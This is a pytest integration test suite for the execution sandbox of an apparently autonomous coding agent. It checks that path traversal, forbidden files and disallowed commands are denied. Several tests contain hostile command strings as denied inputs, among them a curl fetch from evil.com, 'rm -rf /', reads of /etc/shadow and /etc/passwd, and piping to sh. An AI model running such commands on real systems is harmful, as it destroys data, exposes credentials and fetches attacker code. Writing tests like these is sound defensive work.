"""
Integration Test Suite for Programmer V1 Phase 2.6: Execution Boundary Integration Tests.

Validates the integrated operational envelope combining:
- ManagerTask (originating lineage)
- ProgrammerWorkOrder (authorized scope, constraints, budgets)
- ProgrammerExecution (active worker lifecycle)
- ProgrammerWorkspace & WorkspaceProvisioner (confined staging root)
- FilesystemBoundaryResolver (path policy authorization)
- CommandBoundaryResolver (command syntax, subcommands, arguments)
- ProgrammerExecutionContext (unified runtime capability container)

Verifies all 17 required boundary test cases:
 1. READ allowed file -> ALLOW
 2. READ forbidden file -> DENY
 3. WRITE writable file -> ALLOW
 4. WRITE read-only file -> DENY
 5. WRITE outside workspace -> DENY
 6. DELETE forbidden file -> DENY
 7. EXECUTE allowed command -> ALLOW
 8. EXECUTE unknown command -> DENY
 9. EXECUTE command containing unauthorized shell chaining -> DENY / INVALID
10. EXECUTE with working directory outside workspace -> DENY / INVALID
11. WorkOrder from another Manager task -> DENY
12. Failed workspace provisioning -> execution context cannot become READY
13. Invalid filesystem scope -> context creation fails
14. Invalid command scope -> context creation fails
15. Attempted path traversal -> DENY
16. Attempted authorization bypass through path normalization -> DENY
17. Attempted command-policy bypass -> DENY

Lineage Verification:
ManagerTask -> ProgrammerWorkOrder -> ProgrammerExecution -> Workspace -> ExecutionContext -> Policy Decision
Every authorization decision is strictly traceable back to the execution context.
"""

from pathlib import Path
import pytest

from core.models import Task
from core.programmer.contracts.command_resolver import (
    CommandBoundaryResolver,
    CommandDecision,
    CommandRequest,
)
from core.programmer.contracts.command_scope import AllowedCommand
from core.programmer.contracts.execution import ProgrammerExecution
from core.programmer.contracts.execution_context import ProgrammerExecutionContext
from core.programmer.contracts.filesystem_resolver import (
    FilesystemBoundaryResolver,
    FilesystemDecision,
)
from core.programmer.contracts.identifiers import (
    new_execution_id,
    new_work_order_id,
    new_workspace_id,
)
from core.programmer.contracts.provisioner import (
    WorkspaceProvisioner,
    WorkspaceProvisioningResult,
)
from core.programmer.contracts.work_order import ProgrammerWorkOrder
from core.programmer.contracts.workspace import ProgrammerWorkspace
from core.programmer.errors import (
    InvalidCommandScopeError,
    InvalidPathScopeError,
    ProgrammerError,
    ProgrammerLineageError,
    ProgrammerValidationError,
)
from core.programmer.types import (
    CommandDecisionType,
    ExecutionContextStatus,
    FilesystemOperation,
    PathBoundaryScope,
    ProgrammerExecutionStatus,
    WorkspaceIsolationMode,
    WorkspaceProvisioningErrorCode,
    WorkspaceProvisioningStatus,
)


# ==============================================================================
# Fixtures
# ==============================================================================


@pytest.fixture
def manager_task() -> Task:
    """Originating Manager Task establishing causal lineage and boundaries."""
    return Task(
        id="tsk-mgr-9001",
        project_id="prj-autonomos-omega",
        title="Implement secure session token manager",
        objective="Create token manager module with validation and tests",
        metadata={
            "correlation_id": "corr-session-9001",
            "allowed_paths": ["src/session", "tests/session"],
            "writable_paths": [
                "src/session/token_manager.py",
                "tests/session/test_token_manager.py",
            ],
            "read_only_paths": ["src/session/config.json"],
            "forbidden_paths": ["src/session/secrets.key", ".git", "config/keys"],
            "allowed_commands": [
                {"command": "pytest", "allow_args": True},
                {"command": "git", "allowed_subcommands": ["status", "diff"]},
            ],
            "iteration_budget": 10,
            "time_budget": 600,
        },
    )


@pytest.fixture
def workspace_dir(tmp_path: Path) -> Path:
    """Confined filesystem root representing project repository."""
    ws = tmp_path / "project_root"
    ws.mkdir(parents=True, exist_ok=True)
    (ws / "src" / "session").mkdir(parents=True, exist_ok=True)
    (ws / "tests" / "session").mkdir(parents=True, exist_ok=True)
    (ws / "config" / "keys").mkdir(parents=True, exist_ok=True)

    # Populate fixture files
    (ws / "src" / "session" / "token_manager.py").write_text("# token manager")
    (ws / "src" / "session" / "config.json").write_text('{"env": "test"}')
    (ws / "src" / "session" / "secrets.key").write_text("SUPER_SECRET_KEY")
    (ws / "tests" / "session" / "test_token_manager.py").write_text("# tests")

    return ws


@pytest.fixture
def bounded_work_order(manager_task: Task) -> ProgrammerWorkOrder:
    """Validated ProgrammerWorkOrder derived directly from the ManagerTask."""
    return ProgrammerWorkOrder(
        work_order_id=new_work_order_id(),
        manager_task_id=manager_task.id,
        project_id=manager_task.project_id,
        correlation_id=manager_task.metadata.get("correlation_id", "corr-9001"),
        objective="Create token manager module with validation and tests",
        allowed_paths=["src/session", "tests/session"],
        writable_paths=[
            "src/session/token_manager.py",
            "tests/session/test_token_manager.py",
        ],
        read_only_paths=["src/session/config.json"],
        forbidden_paths=["src/session/secrets.key", ".git", "config/keys"],
        allowed_commands=[
            AllowedCommand(command="pytest", allow_args=True),
            AllowedCommand(command="git", allowed_subcommands=["status", "diff"]),
        ],
        iteration_budget=10,
        time_budget=600,
    )


@pytest.fixture
def active_execution(bounded_work_order: ProgrammerWorkOrder) -> ProgrammerExecution:
    """Active execution bound to the work order and manager task."""
    return ProgrammerExecution(
        execution_id=new_execution_id(),
        work_order_id=bounded_work_order.work_order_id,
        task_id=bounded_work_order.manager_task_id,
        project_id=bounded_work_order.project_id,
        correlation_id=bounded_work_order.correlation_id,
        status=ProgrammerExecutionStatus.STARTING,
    )


@pytest.fixture
def provisioned_context(
    bounded_work_order: ProgrammerWorkOrder,
    active_execution: ProgrammerExecution,
    workspace_dir: Path,
) -> ProgrammerExecutionContext:
    """Fully provisioned, READY ProgrammerExecutionContext."""
    provisioner = WorkspaceProvisioner(
        project_resolver={bounded_work_order.project_id: str(workspace_dir)}
    )
    result = provisioner.provision(
        work_order=bounded_work_order,
        execution=active_execution,
    )
    assert result.is_ready() is True
    assert result.execution_context is not None
    return result.execution_context


# ==============================================================================
# 1. READ Operations
# ==============================================================================


def test_1_read_allowed_file_returns_allow(
    provisioned_context: ProgrammerExecutionContext,
) -> None:
    """Scenario 1: READ allowed file -> ALLOW."""
    decision = provisioned_context.may_read_file("src/session/config.json")
    assert decision.allowed is True
    assert decision.scope == PathBoundaryScope.READ_ONLY
    assert decision.policy_rule == "READ_PERMITTED"

    # Also writable files are in allowed_paths and can be read
    decision_writable = provisioned_context.may_read_file("src/session/token_manager.py")
    assert decision_writable.allowed is True
    assert decision_writable.scope == PathBoundaryScope.WRITABLE
    assert decision_writable.policy_rule == "READ_PERMITTED"


def test_2_read_forbidden_file_returns_deny(
    provisioned_context: ProgrammerExecutionContext,
) -> None:
    """Scenario 2: READ forbidden file -> DENY."""
    decision = provisioned_context.may_read_file("src/session/secrets.key")
    assert decision.allowed is False
    assert decision.scope == PathBoundaryScope.FORBIDDEN
    assert "FORBIDDEN" in decision.policy_rule
    assert "forbidden" in decision.reason.lower()


# ==============================================================================
# 2. WRITE & DELETE Operations
# ==============================================================================


def test_3_write_writable_file_returns_allow(
    provisioned_context: ProgrammerExecutionContext,
) -> None:
    """Scenario 3: WRITE writable file -> ALLOW."""
    decision = provisioned_context.may_write_file("src/session/token_manager.py")
    assert decision.allowed is True
    assert decision.scope == PathBoundaryScope.WRITABLE
    assert decision.policy_rule == "WRITE_PERMITTED"


def test_4_write_read_only_file_returns_deny(
    provisioned_context: ProgrammerExecutionContext,
) -> None:
    """Scenario 4: WRITE read-only file -> DENY."""
    decision = provisioned_context.may_write_file("src/session/config.json")
    assert decision.allowed is False
    assert decision.scope == PathBoundaryScope.READ_ONLY
    assert "READ_ONLY" in decision.policy_rule
    assert "must be writable" in decision.reason.lower()


def test_5_write_outside_workspace_returns_deny(
    provisioned_context: ProgrammerExecutionContext,
) -> None:
    """Scenario 5: WRITE outside workspace -> DENY."""
    # Absolute escape
    decision_abs = provisioned_context.may_write_file("/etc/passwd")
    assert decision_abs.allowed is False
    assert decision_abs.scope == PathBoundaryScope.OUTSIDE_BOUNDARY

    # Relative escape
    decision_rel = provisioned_context.may_write_file("../../outside.txt")
    assert decision_rel.allowed is False
    assert decision_rel.scope == PathBoundaryScope.OUTSIDE_BOUNDARY


def test_6_delete_forbidden_file_returns_deny(
    provisioned_context: ProgrammerExecutionContext,
) -> None:
    """Scenario 6: DELETE forbidden file -> DENY."""
    decision = provisioned_context.may_delete_file("src/session/secrets.key")
    assert decision.allowed is False
    assert decision.scope == PathBoundaryScope.FORBIDDEN
    assert "FORBIDDEN" in decision.policy_rule


# ==============================================================================
# 3. COMMAND Execution Policy
# ==============================================================================


def test_7_execute_allowed_command_returns_allow(
    provisioned_context: ProgrammerExecutionContext,
) -> None:
    """Scenario 7: EXECUTE allowed command -> ALLOW."""
    decision = provisioned_context.may_execute_command("pytest tests/session/test_token_manager.py")
    assert decision.allowed is True
    assert decision.decision == CommandDecisionType.ALLOW
    assert decision.matched_rule == "pytest"


def test_8_execute_unknown_command_returns_deny(
    provisioned_context: ProgrammerExecutionContext,
) -> None:
    """Scenario 8: EXECUTE unknown command -> DENY."""
    decision = provisioned_context.may_execute_command("curl https://evil.com/payload")
    assert decision.allowed is False
    assert decision.decision == CommandDecisionType.DENY
    assert decision.matched_rule == "EXECUTABLE_NOT_ALLOWED"
    assert "not in allowed_commands" in decision.reason.lower()


def test_9_execute_command_with_unauthorized_shell_chaining_returns_deny(
    provisioned_context: ProgrammerExecutionContext,
) -> None:
    """Scenario 9: EXECUTE command containing unauthorized shell chaining -> DENY / INVALID."""
    # Chaining with &&
    d1 = provisioned_context.may_execute_command("pytest && rm -rf /")
    assert d1.allowed is False
    assert d1.decision == CommandDecisionType.INVALID
    assert d1.matched_rule == "UNSUPPORTED_SHELL_CONSTRUCT"

    # Chaining with ;
    d2 = provisioned_context.may_execute_command("pytest; cat /etc/shadow")
    assert d2.allowed is False
    assert d2.decision == CommandDecisionType.INVALID
    assert d2.matched_rule == "UNSUPPORTED_SHELL_CONSTRUCT"

    # Chaining with newline
    d3 = provisioned_context.may_execute_command("pytest\nmalicious_cmd")
    assert d3.allowed is False
    assert d3.decision == CommandDecisionType.INVALID

    # Pipe construct
    d4 = provisioned_context.may_execute_command("pytest | sh")
    assert d4.allowed is False
    assert d4.decision == CommandDecisionType.INVALID

    # Redirection construct
    d5 = provisioned_context.may_execute_command("pytest > /tmp/output")
    assert d5.allowed is False
    assert d5.decision == CommandDecisionType.INVALID


def test_10_execute_with_working_directory_outside_workspace_returns_deny(
    provisioned_context: ProgrammerExecutionContext,
) -> None:
    """Scenario 10: EXECUTE with working directory outside workspace -> DENY / INVALID."""
    # Absolute working directory outside workspace
    d_abs = provisioned_context.may_execute_command("pytest", working_directory="/tmp")
    assert d_abs.allowed is False
    assert d_abs.decision == CommandDecisionType.INVALID
    assert d_abs.matched_rule == "WORKING_DIRECTORY_OUTSIDE_WORKSPACE"

    # Relative working directory escaping root
    d_rel = provisioned_context.may_execute_command("pytest", working_directory="../../")
    assert d_rel.allowed is False
    assert d_rel.decision == CommandDecisionType.INVALID
    assert d_rel.matched_rule == "WORKING_DIRECTORY_OUTSIDE_WORKSPACE"


# ==============================================================================
# 4. Lineage, Isolation, and Lifecycle Failures
# ==============================================================================


def test_11_work_order_from_another_manager_task_returns_deny(
    bounded_work_order: ProgrammerWorkOrder,
    active_execution: ProgrammerExecution,
    workspace_dir: Path,
) -> None:
    """Scenario 11: WorkOrder from another Manager task -> DENY."""
    # Alter execution to point to a different task
    alien_execution = ProgrammerExecution(
        execution_id=new_execution_id(),
        work_order_id=bounded_work_order.work_order_id,
        task_id="tsk-alien-9999",  # Different from bounded_work_order.manager_task_id
        project_id=bounded_work_order.project_id,
        correlation_id=bounded_work_order.correlation_id,
    )

    # 1. WorkspaceProvisioner rejects mismatched task
    provisioner = WorkspaceProvisioner(
        project_resolver={bounded_work_order.project_id: str(workspace_dir)}
    )
    result = provisioner.provision(
        work_order=bounded_work_order,
        execution=alien_execution,
    )
    assert result.status == WorkspaceProvisioningStatus.FAILED
    assert result.error_code == WorkspaceProvisioningErrorCode.INVALID_WORKSPACE
    assert "task_id mismatch" in (result.error_message or "")
    assert result.is_ready() is False

    # 2. Context creation directly rejects mismatched task
    ws = ProgrammerWorkspace.from_work_order(bounded_work_order, root_path=str(workspace_dir))
    with pytest.raises(ProgrammerLineageError) as exc:
        ProgrammerExecutionContext.build(
            work_order=bounded_work_order,
            execution=alien_execution,
            workspace=ws,
        )
    assert "Manager task mismatch" in str(exc.value)

    # 3. Context in FAILED state strictly denies queries
    failed_ctx = ProgrammerExecutionContext.build(
        work_order=bounded_work_order,
        execution=alien_execution,
        workspace=ws,
        raise_on_failure=False,
    )
    assert failed_ctx.is_failed() is True
    with pytest.raises(ProgrammerError) as exc_failed:
        failed_ctx.may_read_file("src/session/config.json")
    assert "cannot be used for execution" in str(exc_failed.value)


def test_12_failed_workspace_provisioning_cannot_become_ready(
    bounded_work_order: ProgrammerWorkOrder,
    active_execution: ProgrammerExecution,
    tmp_path: Path,
) -> None:
    """Scenario 12: Failed workspace provisioning -> execution context cannot become READY."""
    # Attempt provisioning with non-existent root path
    non_existent_root = str(tmp_path / "non_existent_dir_1234")
    provisioner = WorkspaceProvisioner()
    result = provisioner.provision(
        work_order=bounded_work_order,
        execution=active_execution,
        root_path_override=non_existent_root,
    )

    assert result.status == WorkspaceProvisioningStatus.FAILED
    assert result.error_code == WorkspaceProvisioningErrorCode.WORKSPACE_UNAVAILABLE
    assert result.workspace is None
    assert result.execution_context is None
    assert result.is_ready() is False


def test_13_invalid_filesystem_scope_context_creation_fails(
    active_execution: ProgrammerExecution,
    workspace_dir: Path,
) -> None:
    """Scenario 13: Invalid filesystem scope -> context creation fails."""
    # Writable path not within allowed path scope
    invalid_work_order = ProgrammerWorkOrder(
        work_order_id=new_work_order_id(),
        manager_task_id=active_execution.task_id,
        project_id=active_execution.project_id,
        correlation_id=active_execution.correlation_id,
        objective="Invalid scope test",
        allowed_paths=["src/session"],
        writable_paths=["unauthorized_dir/evil.py"],  # Outside allowed_paths!
    )

    # 1. WorkspaceProvisioner rejects invalid filesystem scope
    provisioner = WorkspaceProvisioner(
        project_resolver={active_execution.project_id: str(workspace_dir)}
    )
    prov_result = provisioner.provision(invalid_work_order, active_execution)
    assert prov_result.status == WorkspaceProvisioningStatus.FAILED
    assert prov_result.error_code == WorkspaceProvisioningErrorCode.INVALID_WORKSPACE
    assert prov_result.execution_context is None
    assert prov_result.is_ready() is False

    # 2. Workspace and context validation strictly fail on invalid scope
    with pytest.raises(InvalidPathScopeError) as exc:
        ws = ProgrammerWorkspace(
            workspace_id=new_workspace_id(),
            work_order_id=invalid_work_order.work_order_id,
            project_id=invalid_work_order.project_id,
            root_path=str(workspace_dir),
            allowed_paths=invalid_work_order.allowed_paths,
            writable_paths=invalid_work_order.writable_paths,
        )
        ProgrammerExecutionContext.build(
            work_order=invalid_work_order,
            execution=active_execution,
            workspace=ws,
        )
    assert "exceeds permitted allowed_paths scope" in str(exc.value)


def test_14_invalid_command_scope_context_creation_fails(
    bounded_work_order: ProgrammerWorkOrder,
    active_execution: ProgrammerExecution,
    workspace_dir: Path,
) -> None:
    """Scenario 14: Invalid command scope -> context creation fails."""
    # Create work order with shell injection in AllowedCommand specification
    invalid_work_order = ProgrammerWorkOrder(
        work_order_id=new_work_order_id(),
        manager_task_id=active_execution.task_id,
        project_id=active_execution.project_id,
        correlation_id=active_execution.correlation_id,
        objective="Invalid command scope test",
        allowed_paths=["src/session"],
        allowed_commands=[
            AllowedCommand(command="pytest && rm -rf /"),  # Disallowed in spec!
        ],
    )

    ws = ProgrammerWorkspace.from_work_order(invalid_work_order, root_path=str(workspace_dir))

    with pytest.raises(InvalidCommandScopeError) as exc:
        ProgrammerExecutionContext.build(
            work_order=invalid_work_order,
            execution=active_execution,
            workspace=ws,
        )
    assert "shell injection or chaining syntax" in str(exc.value)


# ==============================================================================
# 5. Evasion & Bypass Defenses
# ==============================================================================


def test_15_attempted_path_traversal_returns_deny(
    provisioned_context: ProgrammerExecutionContext,
) -> None:
    """Scenario 15: Attempted path traversal -> DENY."""
    # Direct traversal in read
    d_read = provisioned_context.may_read_file("../../../etc/shadow")
    assert d_read.allowed is False
    assert d_read.scope == PathBoundaryScope.OUTSIDE_BOUNDARY
    assert d_read.policy_rule == "PATH_TRAVERSAL_OR_INVALID"

    # Traversal in write
    d_write = provisioned_context.may_write_file("src/session/../../../../var/log/syslog")
    assert d_write.allowed is False
    assert d_write.scope == PathBoundaryScope.OUTSIDE_BOUNDARY
    assert d_write.policy_rule == "PATH_TRAVERSAL_OR_INVALID"

    # Traversal in rename destination
    d_rename = provisioned_context.may_rename_file(
        "src/session/token_manager.py",
        "../../escape.py",
    )
    assert d_rename.allowed is False
    assert d_rename.destination_scope == PathBoundaryScope.OUTSIDE_BOUNDARY

    # Traversal in command arguments
    d_cmd = provisioned_context.may_execute_command("pytest ../../test_outside.py")
    assert d_cmd.allowed is False
    assert d_cmd.decision == CommandDecisionType.DENY
    assert d_cmd.matched_rule == "ARGUMENT_TRAVERSAL_DETECTED"


def test_16_attempted_authorization_bypass_through_normalization_returns_deny(
    provisioned_context: ProgrammerExecutionContext,
) -> None:
    """Scenario 16: Attempted authorization bypass through path normalization -> DENY."""
    # Sibling prefix collision bypass:
    # allowed_paths includes 'src/session', attacker requests 'src/session_backdoor'
    d_sibling = provisioned_context.may_read_file("src/session_backdoor/evil.py")
    assert d_sibling.allowed is False
    assert d_sibling.scope == PathBoundaryScope.OUTSIDE_BOUNDARY

    # Traversal navigating back to forbidden file
    # 'src/session/../session/secrets.key' normalizes to 'src/session/secrets.key'
    d_disguised_forbidden = provisioned_context.may_read_file("src/session/../session/secrets.key")
    assert d_disguised_forbidden.allowed is False
    assert d_disguised_forbidden.scope == PathBoundaryScope.FORBIDDEN
    assert "FORBIDDEN" in d_disguised_forbidden.policy_rule

    # Disguised write to read-only file
    d_disguised_ro = provisioned_context.may_write_file("src/session/./config.json")
    assert d_disguised_ro.allowed is False
    assert d_disguised_ro.scope == PathBoundaryScope.READ_ONLY

    # Null byte injection
    d_null = provisioned_context.may_read_file("src/session/config.json\0.txt")
    assert d_null.allowed is False
    assert d_null.scope == PathBoundaryScope.OUTSIDE_BOUNDARY
    assert "Null bytes" in d_null.reason


def test_17_attempted_command_policy_bypass_returns_deny(
    provisioned_context: ProgrammerExecutionContext,
) -> None:
    """Scenario 17: Attempted command-policy bypass -> DENY."""
    # Subcommand expansion bypass (allowed: git status, git diff)
    d_push = provisioned_context.may_execute_command("git push origin main")
    assert d_push.allowed is False
    assert d_push.decision == CommandDecisionType.DENY
    assert d_push.matched_rule == "SUBCOMMAND_NOT_ALLOWED"
    assert "push" in d_push.reason.lower()

    d_checkout = provisioned_context.may_execute_command("git checkout -b evil")
    assert d_checkout.allowed is False
    assert d_checkout.decision == CommandDecisionType.DENY
    assert d_checkout.matched_rule == "SUBCOMMAND_NOT_ALLOWED"

    # Sibling executable bypass (allowed: pytest)
    d_sibling = provisioned_context.may_execute_command("pytest_malicious tests/")
    assert d_sibling.allowed is False
    assert d_sibling.decision == CommandDecisionType.DENY

    # Shell command substitution bypass
    d_subst = provisioned_context.may_execute_command("pytest $(cat /etc/passwd)")
    assert d_subst.allowed is False
    assert d_subst.decision == CommandDecisionType.INVALID
    assert d_subst.matched_rule == "UNSUPPORTED_SHELL_CONSTRUCT"


# ==============================================================================
# 6. Complete Causal Lineage Verification
# ==============================================================================


def test_18_complete_causal_lineage_traceable_from_task_to_decision(
    manager_task: Task,
    bounded_work_order: ProgrammerWorkOrder,
    active_execution: ProgrammerExecution,
    provisioned_context: ProgrammerExecutionContext,
) -> None:
    """
    Test complete unbroken causal lineage:
    ManagerTask
    -> ProgrammerWorkOrder
    -> ProgrammerExecution
    -> Workspace
    -> ExecutionContext
    -> Policy Decision

    Every authorization decision must be traceable back to the execution context.
    """
    # 1. Lineage from Task to WorkOrder
    assert bounded_work_order.manager_task_id == manager_task.id
    assert bounded_work_order.project_id == manager_task.project_id
    assert bounded_work_order.correlation_id == manager_task.metadata["correlation_id"]

    # 2. Lineage from WorkOrder to Execution
    assert active_execution.work_order_id == bounded_work_order.work_order_id
    assert active_execution.task_id == bounded_work_order.manager_task_id
    assert active_execution.project_id == bounded_work_order.project_id
    assert active_execution.correlation_id == bounded_work_order.correlation_id

    # 3. Lineage from Execution to Workspace
    workspace = provisioned_context.workspace
    assert workspace.work_order_id == bounded_work_order.work_order_id
    assert workspace.execution_id == active_execution.execution_id
    assert workspace.project_id == bounded_work_order.project_id

    # 4. Lineage within ExecutionContext
    assert provisioned_context.work_order_id == bounded_work_order.work_order_id
    assert provisioned_context.execution_id == active_execution.execution_id
    assert provisioned_context.workspace_id == workspace.workspace_id
    assert provisioned_context.project_id == manager_task.project_id
    assert provisioned_context.manager_task_id == manager_task.id

    # 5. Lineage in Policy Decisions (Filesystem)
    fs_decision: FilesystemDecision = provisioned_context.may_write_file("src/session/token_manager.py")
    assert fs_decision.allowed is True
    assert fs_decision.trace["execution_id"] == active_execution.execution_id
    assert fs_decision.trace["work_order_id"] == bounded_work_order.work_order_id
    assert fs_decision.trace["manager_task_id"] == manager_task.id
    assert fs_decision.trace["workspace_id"] == workspace.workspace_id
    assert fs_decision.trace["project_id"] == manager_task.project_id

    # 6. Lineage in Policy Decisions (Command)
    cmd_decision: CommandDecision = provisioned_context.may_execute_command("pytest")
    assert cmd_decision.allowed is True
    assert cmd_decision.trace["execution_id"] == active_execution.execution_id
    assert cmd_decision.trace["work_order_id"] == bounded_work_order.work_order_id
    assert cmd_decision.trace["manager_task_id"] == manager_task.id
    assert cmd_decision.trace["workspace_id"] == workspace.workspace_id
    assert cmd_decision.trace["project_id"] == manager_task.project_id
